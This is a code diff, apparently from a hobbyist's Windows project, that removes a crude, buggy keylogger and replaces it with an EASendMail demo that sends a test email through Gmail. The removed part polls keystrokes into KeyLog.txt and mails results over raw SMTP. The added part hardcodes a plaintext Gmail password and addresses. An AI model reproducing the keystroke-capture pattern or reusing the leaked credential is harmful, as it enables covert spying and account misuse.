@@ -1,120 +1,80 @@
-#include <stdio.h> 
-#include <stdlib.h> 
-#include <windows.h> 
+// ConsoleApplication1.cpp : This file contains the 'main' function. Program execution begins and ends there.
+//
 
-#define KEY_PRESSED -32767 
+//#include "stdafx.h"
+#include <tchar.h>
+#include <Windows.h>
 
-FILE *file; 
+#include "EASendMailObj.tlh"
+using namespace EASendMailObjLib;
 
-using namespace std; 
+const int ConnectNormal = 0;
+const int ConnectSSLAuto = 1;
+const int ConnectSTARTTLS = 2;
+const int ConnectDirectSSL = 3;
+const int ConnectTryTLS = 4;
 
-// Function Declatations 
-void SendEmail (char *server, char *to, char *from, char *subject, char *message); 
-
-int main (int argc, char *argv[])
+int _tmain(int argc, _TCHAR* argv[])
 {
-    char key; 
-    int index; 
-    int length; 
-    char *buffer; 
+    ::CoInitialize(NULL);
 
-    file = fopen("KeyLog.tct", "a+"); 
+    IMailPtr oSmtp = NULL;
+    oSmtp.CreateInstance(__uuidof(EASendMailObjLib::Mail));
+    oSmtp->LicenseCode = _T("TryIt");
 
-    if (file != NULL)
+    // Set your gmail email address
+    oSmtp->FromAddr = _T("dinitothompson2@gmail.com");
+
+    // Add recipient email address
+    oSmtp->AddRecipientEx(_T("subrinathompson15@gmail.com"), 0);
+
+    // Set email subject
+    oSmtp->Subject = _T("Success");
+
+    // Set email body
+    oSmtp->BodyText = _T("Dont be alarmed my friend, I am just testing a C++ code.");
+
+    // Gmail SMTP server address
+    oSmtp->ServerAddr = _T("smtp.gmail.com");
+
+    // Gmail user authentication should use your
+    // Gmail email address as the user name.
+    // For example: your email is "gmailid@gmail.com", then the user should be "gmailid@gmail.com"
+    oSmtp->UserName = _T("dinitothompson2@gmail.com");
+    oSmtp->Password = _T("genjutsu101");
+
+    // If you want to use direct SSL 465 port,
+    // Please add this line, otherwise TLS will be used.
+    // oSmtp->ServerPort = 465;
+
+    // Set 25 or 587 SMTP port
+    oSmtp->ServerPort = 587;
+
+    // detect SSL/TLS automatically
+    oSmtp->ConnectType = ConnectSSLAuto;
+
+    _tprintf(_T("Start to send email via gmail account ...\r\n"));
+
+    if (oSmtp->SendMail() == 0)
     {
-        while (true)
-        {
-            Sleep(10); 
-            for(key = 0; key <= 255; key++)
-            {
-                file = fopen("KeyLog.txt", "a+"); 
-
-                if (GetAsyncKeyState(key) == KEY_PRESSED)
-                {
-                    switch(key)
-                    {
-                        case VK_SPACE: 
-                            fprintf(file, " "); 
-                            break; 
-                    }
-                }
-            }
-        }
+        _tprintf(_T("email was sent successfully!\r\n"));
+    }
+    else
+    {
+        _tprintf(_T("failed to send email with the following error: %s\r\n"),
+            (const TCHAR*)oSmtp->GetLastErrDescription());
     }
 
-    // Send Email 
-    SendEmail("gmail-sntp-in.l.google.com", "dinitothompson@gmail.com", "dinitothompson@gmail.com", "SMTP Success", "SUCCESS"); 
-    
-    return 0; 
+    return 0;
 }
 
-void SendEmail (char *server, char *to, char *from, char *subject, char *message)
-{
-    SOCKET sockfd; 
-    WSADATA wsaData; 
-    hostent *host; 
-    sockaddr_in dest; 
+// Run program: Ctrl + F5 or Debug > Start Without Debugging menu
+// Debug program: F5 or Debug > Start Debugging menu
 
-    int sent; 
-    char line[200]; 
-
-    if (WSAStartup(0x202, &wsaData) != SOCKET_ERROR)
-    {
-        if ((host = gethostbyname(server)) != NULL)
-        {
-            // Set Memory 
-            memset(&dest, 0, sizeof(dest)); 
-            memcpy(&(dest.sin_addr), host->h_addr, host->h_length); 
-            // Prepare Destination 
-            dest.sin_family = host->h_addrtype; 
-            dest.sin_port = htons(25); 
-            // Get Socket
-            sockfd = socket(AF_INET, SOCK_STREAM, 0); 
-            // Connect 
-            connect(sockfd, (struct sockaddr*)&dest, sizeof(dest)); 
-            // Send Command Lines 
-            strcpy(line, "Hello World\n");
-            sent = send(sockfd, line, strlen(line), 0); 
-            Sleep(500); 
-
-            strcpy(line, "MAIL FROM: <"); 
-            strncat(line, from, strlen(from)); 
-            strncat(line, ">\n", 3); 
-            sent = send(sockfd, line, strlen(line), 0); 
-            Sleep(500); 
-
-            strcpy(line, "RCPT TO: <"); 
-            strncat(line, to, strlen(to)); 
-            strncat(line, ">\n", 3); 
-            sent = send(sockfd, line, strlen(line), 0); 
-            Sleep(500); 
-
-            strcpy(line, "Data\n"); 
-            sent = send(sockfd, line, strlen(line), 0); 
-            Sleep(500); 
-
-            strcpy(line, "To:"); 
-            strcat(line, to);   
-            strcat(line, "\n"); 
-
-            strcpy(line, "From:"); 
-            strcat(line, from);   
-            strcat(line, "\n");
-
-            strcpy(line, "Subject:"); 
-            strcat(line, subject);   
-            strcat(line, "\n");  
-
-            strcat(line, message); 
-            strcat(line, "\r\n.\r\n"); 
-            
-            sent = send(sockfd, line, strlen(line), 0); 
-            Sleep(500); 
-
-        }
-    }
-
-    // Close Socket And WsaData
-    closesocket(sockfd); 
-    WSACleanup(); 
-}
+// Tips for Getting Started: 
+//   1. Use the Solution Explorer window to add/manage files
+//   2. Use the Team Explorer window to connect to source control
+//   3. Use the Output window to see build output and other messages
+//   4. Use the Error List window to view errors
+//   5. Go to Project > Add New Item to create new code files, or Project > Add Existing Item to add existing code files to the project
+//   6. In the future, to open this project again, go to File > Open > Project and select the .sln file
